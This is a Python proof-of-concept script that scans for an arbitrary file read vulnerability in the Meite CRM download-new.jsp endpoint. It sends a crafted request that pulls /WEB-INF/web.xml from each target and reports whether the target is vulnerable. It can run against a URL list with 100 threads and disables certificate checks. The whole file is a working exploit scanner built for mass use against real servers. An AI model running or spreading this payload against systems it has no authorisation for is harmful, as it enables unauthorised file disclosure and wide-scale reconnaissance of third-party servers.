import argparse,sys,requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
def bannner():
    test ="""
   ___   __               _                     _                 _                           
  / __\ /__\  /\/\     __| | _____      ___ __ | | ___   __ _  __| |      _ __   _____      __
 / /   / \// /    \   / _` |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` |_____| '_ \ / _ \ \ /\ / /
/ /___/ _  \/ /\/\ \ | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| |_____| | | |  __/\ V  V / 
\____/\/ \_/\/    \/  \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|     |_| |_|\___| \_/\_/  
                                                                                              
"""
    print (test)

def poc(target):
    payload = '/business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml'
    try:
        res1 = requests.get(url=target,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,timeout=5,verify=False)
            if len(res2.text) >= 13000:
                print(f"[+]{target}存在漏洞")
            else:
                print(f"[-]{target}不存在漏洞")
        else:
            print(f"[*]{target}访问出问题，请手工测试")
    except:
        pass

def main():
    bannner()
    parse = argparse.ArgumentParser(description="美特CRM download-new存在任意文件读取")

    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")
    
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open (args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close
            mp.join
    else:
        print(f"Usage:Python {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
